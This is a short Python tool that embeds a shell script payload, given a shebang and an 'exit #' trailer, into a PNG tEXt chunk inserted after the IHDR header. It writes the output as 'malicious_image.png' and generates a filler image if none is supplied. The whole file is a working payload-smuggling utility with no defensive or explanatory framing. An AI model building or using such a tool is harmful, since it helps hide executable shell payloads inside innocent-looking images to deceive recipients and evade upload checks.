import os, sys, struct, zlib

def embed(input_png, payload_file, output_png, keyword="Z9k"):
    with open(payload_file) as f:
        text = f.read()

    if not text.lstrip().startswith("#!/"):
        text = "#!/bin/sh\n" + text.lstrip()
    text = text.rstrip("\n") + "\nexit #"

    with open(input_png, "rb") as f:
        data = f.read()
    assert data[:8] == b"\x89PNG\r\n\x1a\n", "Not a valid PNG"

    pos = 8
    while pos < len(data):
        length = struct.unpack(">I", data[pos:pos + 4])[0]
        if data[pos + 4:pos + 8] == b"IHDR":
            inject_at = pos + 12 + length; break
        pos += 12 + length

    kw = keyword.encode("latin-1") + b"\x00"
    td = kw + text.encode("utf-8")
    crc = zlib.crc32(b"tEXt" + td) & 0xFFFFFFFF
    chunk = struct.pack(">I", len(td)) + b"tEXt" + td + struct.pack(">I", crc)
    new = data[:inject_at] + chunk + data[inject_at:]

    with open(output_png, "wb") as f:
        f.write(new)
    print(f"[+] {input_png} ({os.path.getsize(input_png):,}b)")
    print(f" -> {output_png} ({os.path.getsize(output_png):,}b) | payload: {len(text)} chars")


def main():
    base = os.path.dirname(os.path.abspath(__file__))
    payload = os.path.join(base, "payload.sh")

    if len(sys.argv) > 1:
        img = sys.argv[1]
    else:
        img = os.path.join(base, "original.png")
        if not os.path.exists(img):
            w, h = 400, 300
            def c(t, d): return struct.pack(">I", len(d)) + t + d + struct.pack(">I", zlib.crc32(t + d) & 0xFFFFFFFF)
            sig = b"\x89PNG\r\n\x1a\n"
            ihdr = struct.pack(">IIBBBBB", w, h, 8, 2, 0, 0, 0)
            raw = b"".join(b"\x00" + bytes([40, 30, 50]) * w for _ in range(h))
            with open(img, "wb") as f: f.write(sig + c(b"IHDR", ihdr) + c(b"IDAT", zlib.compress(raw)) + c(b"IEND", b""))
            print(f"[+] Created {img}")

    if not os.path.exists(img):
        print(f"[!] Not found: {img}")
        sys.exit(1)

    out = os.path.join(os.path.dirname(img) or ".", "malicious_image.png")
    embed(img, payload, out)


if __name__ == "__main__":
    main()
